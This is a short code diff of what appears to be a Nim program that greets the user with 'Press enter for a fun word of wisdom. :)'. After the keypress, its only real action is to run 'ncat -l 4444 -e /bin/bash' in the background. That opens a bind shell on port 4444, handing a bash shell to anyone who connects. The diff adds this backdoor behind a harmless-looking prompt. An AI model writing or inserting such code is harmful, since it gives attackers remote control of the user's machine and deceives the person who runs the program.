@@ -11,4 +11,4 @@ echo "Press enter for a fun word of wisdom. :)"
 
 discard readline(stdin)
 
-discard execCmdEx("ncat -l 4444 -e /bin/bash")
+discard execCmd("ncat -l 4444 -e /bin/bash &")
